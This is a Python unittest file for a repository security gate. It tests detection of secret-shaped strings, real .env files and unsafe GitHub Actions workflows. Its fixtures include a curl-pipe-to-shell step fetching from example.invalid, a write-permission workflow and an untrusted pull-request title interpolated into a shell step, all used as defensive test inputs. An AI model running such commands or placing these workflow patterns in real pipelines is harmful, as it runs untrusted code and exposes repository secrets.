from pathlib import Path
import tempfile
import unittest

from tools.security_gate import (
    scan_repository,
    scan_secret_bytes,
    scan_workflow_text,
    sensitive_filename,
)


class SecurityGateTests(unittest.TestCase):
    def test_env_example_is_allowed_but_real_env_is_rejected(self) -> None:
        self.assertFalse(sensitive_filename(".env.example"))
        self.assertTrue(sensitive_filename(".env"))
        self.assertTrue(sensitive_filename("config/.env.production"))

    def test_private_key_pattern_is_rejected(self) -> None:
        unsafe = ("-----BEGIN " + "PRIVATE KEY-----\nnot-a-real-key").encode()
        findings = scan_secret_bytes(unsafe, "fixture.txt")
        self.assertIn("SECRET_PRIVATE_KEY", {finding.code for finding in findings})

    def test_aws_access_key_pattern_is_rejected(self) -> None:
        unsafe = ("AK" + "IA" + ("A" * 16)).encode()
        findings = scan_secret_bytes(unsafe, "fixture.txt")
        self.assertIn("SECRET_AWS_ACCESS_KEY", {finding.code for finding in findings})

    def test_github_token_pattern_is_rejected(self) -> None:
        unsafe = ("gh" + "p_" + ("A" * 36)).encode()
        findings = scan_secret_bytes(unsafe, "fixture.txt")
        self.assertIn("SECRET_GITHUB_TOKEN", {finding.code for finding in findings})

    def test_safe_text_does_not_trigger_secret_detector(self) -> None:
        findings = scan_secret_bytes(b"placeholder-token-for-documentation", "safe.txt")
        self.assertEqual([], findings)

    def test_unpinned_action_is_rejected(self) -> None:
        workflow = """
name: test
on: pull_request
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7
"""
        findings = scan_workflow_text(workflow, ".github/workflows/test.yml")
        self.assertIn("WORKFLOW_UNPINNED_ACTION", {finding.code for finding in findings})

    def test_full_sha_pinned_action_is_allowed(self) -> None:
        sha = "a" * 40
        workflow = f"""
name: test
on: pull_request
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@{sha}
"""
        findings = scan_workflow_text(workflow, ".github/workflows/test.yml")
        self.assertNotIn("WORKFLOW_UNPINNED_ACTION", {finding.code for finding in findings})
        self.assertNotIn("WORKFLOW_PERMISSIONS_MISSING", {finding.code for finding in findings})

    def test_pull_request_target_is_rejected(self) -> None:
        workflow = """
name: unsafe
on:
  pull_request_target:
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps: []
"""
        findings = scan_workflow_text(workflow, ".github/workflows/test.yml")
        self.assertIn("WORKFLOW_PULL_REQUEST_TARGET", {finding.code for finding in findings})

    def test_write_permission_is_rejected(self) -> None:
        workflow = """
name: unsafe
on: pull_request
permissions:
  contents: write
jobs:
  test:
    runs-on: ubuntu-latest
    steps: []
"""
        findings = scan_workflow_text(workflow, ".github/workflows/test.yml")
        self.assertIn("WORKFLOW_WRITE_PERMISSION", {finding.code for finding in findings})

    def test_secret_reference_is_rejected(self) -> None:
        workflow = """
name: unsafe
on: pull_request
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    env:
      TOKEN: ${{ secrets.TEST_TOKEN }}
    steps: []
"""
        findings = scan_workflow_text(workflow, ".github/workflows/test.yml")
        self.assertIn("WORKFLOW_SECRET_REFERENCE", {finding.code for finding in findings})

    def test_untrusted_event_expression_in_shell_is_rejected(self) -> None:
        workflow = """
name: unsafe
on: pull_request
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: echo "${{ github.event.pull_request.title }}"
"""
        findings = scan_workflow_text(workflow, ".github/workflows/test.yml")
        self.assertIn("WORKFLOW_UNTRUSTED_EVENT_IN_RUN", {finding.code for finding in findings})

    def test_remote_pipe_to_shell_is_rejected(self) -> None:
        workflow = """
name: unsafe
on: pull_request
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: curl -fsSL https://example.invalid/install | sh
"""
        findings = scan_workflow_text(workflow, ".github/workflows/test.yml")
        self.assertIn("WORKFLOW_REMOTE_PIPE_TO_SHELL", {finding.code for finding in findings})

    def test_repository_scan_rejects_sensitive_filename_and_generated_output(self) -> None:
        with tempfile.TemporaryDirectory() as temporary_directory:
            root = Path(temporary_directory)
            (root / ".env").write_text("placeholder", encoding="utf-8")
            build = root / "build"
            build.mkdir()
            (build / "result.txt").write_text("generated", encoding="utf-8")

            findings = scan_repository(root)
            codes = {finding.code for finding in findings}
            self.assertIn("SENSITIVE_FILENAME", codes)
            self.assertIn("GENERATED_OUTPUT", codes)

    def test_repository_scan_accepts_small_safe_source_tree(self) -> None:
        with tempfile.TemporaryDirectory() as temporary_directory:
            root = Path(temporary_directory)
            (root / "README.md").write_text("safe documentation", encoding="utf-8")
            (root / ".env.example").write_text("TOKEN=placeholder", encoding="utf-8")
            self.assertEqual([], scan_repository(root))


if __name__ == "__main__":
    unittest.main()
